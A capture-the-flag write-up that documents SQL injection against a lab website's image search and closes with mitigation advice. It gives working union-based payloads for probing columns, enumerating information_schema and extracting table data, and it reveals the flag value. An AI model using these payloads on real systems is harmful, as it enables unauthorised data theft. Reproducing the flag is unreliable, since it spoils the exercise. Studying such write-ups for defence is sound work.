# SQL Injection Vulnerability

## Description
SQL Injection (SQLi) is a common web application vulnerability that allows an attacker to interfere with the queries that an application makes to its database. By injecting malicious SQL code into the input fields, an attacker can retrieve, manipulate, or delete data from the database.

## Steps to Exploit
1. **Identify the Vulnerability:**
   - While searching images on the website, we noticed that entering the payload `1 OR 1=1` in the search input field returned all the images from the database. This indicated a SQL injection vulnerability.

2. **Testing SQL Injection Payloads:**
   - We used SQL injection payloads from the [SQL Injection Payload List](https://github.com/payloadbox/sql-injection-payload-list) to explore the vulnerability further.
   - Upon trying the payload `5 UNION ALL SELECT 1,2`, we discovered that the query returned two columns, indicating the structure of the underlying SQL query.

3. **Extracting Database Information:**
   - Using the information gathered, we crafted the following payload to retrieve details from the database:
     ```sql
     5 UNION SELECT 1, CONCAT(table_name,1000001,column_name) FROM information_schema.columns
     ```
   - This allowed us to identify that there is a table named `list_images`, which contains the columns `id`, `url`, `title`, and `comment`.

4. **Retrieving Data:**
   - We then crafted a final payload to extract the data from the `list_images` table:
     ```sql
     5 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images
     ```
   - This payload revealed the following data:
     ```
     ID: 5 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images
     Title: borntosec.ddns.net/images.pngHack me? If you read this just use this md5 decode lowercase then sha256 to win this flag! : 1928e8083cf461a51303633093573c46
     Url: 1
     ```

## Flag
The flag was extracted as part of the title:
`1928e8083cf461a51303633093573c46`

## Impact
SQL Injection vulnerabilities can have severe consequences, including:

- **Data Exfiltration:** Attackers can retrieve sensitive information such as user credentials, personal data, and other confidential records.
  
- **Data Manipulation:** Attackers can modify or delete data, potentially leading to data loss or corruption.
  
- **System Compromise:** In some cases, SQL Injection can be used to gain access to the underlying server, leading to a full system compromise.

## Evidence
*If you have any screenshots or logs showing the injection process or the retrieved data, include them here. Reference them like so:*
![SQL Injection Evidence](screenshots/sql_injection_results.png)

## Mitigation
To protect against SQL Injection vulnerabilities, consider implementing the following measures:

- **Parameterized Queries:** Always use parameterized queries or prepared statements to ensure that user input is treated as data, not executable code.

- **Input Validation:** Validate and sanitize all user inputs to ensure they conform to expected formats and values.

- **Least Privilege:** Ensure that database accounts used by the application have the least privileges necessary, limiting the potential impact of a successful SQL injection attack.

- **Regular Security Audits:** Perform regular security audits and penetration testing to identify and fix potential vulnerabilities.

## Payloads Used
Here are the SQL injection payloads that were used in the attack:

```plaintext
1 OR 1=1
5 UNION ALL SELECT 1,2
5 UNION SELECT 1, CONCAT(table_name,1000001,column_name) FROM information_schema.columns
5 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images
